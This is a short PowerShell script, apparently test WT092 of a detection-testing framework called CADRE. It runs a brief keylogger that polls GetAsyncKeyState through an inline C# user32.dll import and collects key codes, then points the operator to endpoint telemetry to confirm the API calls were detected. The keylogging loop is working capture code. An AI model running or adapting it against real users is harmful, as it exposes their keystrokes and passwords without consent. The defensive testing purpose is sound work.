# CADRE — WT092 — Screen Capture / Keylogging
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT092 - Screen Capture / Keylogging"
start_attack "092" "Screen Capture / Keylogging"
step "PowerShell keylogger (brief capture)"
Add-Type @'
using System; using System.Runtime.InteropServices;
public class K { [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); }
'@
$captured = @()
for($i=0; $i -lt 50; $i++) {
    for($k=9; $k -le 190; $k++) {
        if([K]::GetAsyncKeyState($k) -eq -32767) { $captured += $k }
    }
    Start-Sleep -Milliseconds 10
}
run_cmd "Write-Host 'Captured $($captured.Count) key states — check Endpoint.events.api-*'"
result 0 "WT092 — check Endpoint.events.api-* (GetAsyncKeyState API calls)"
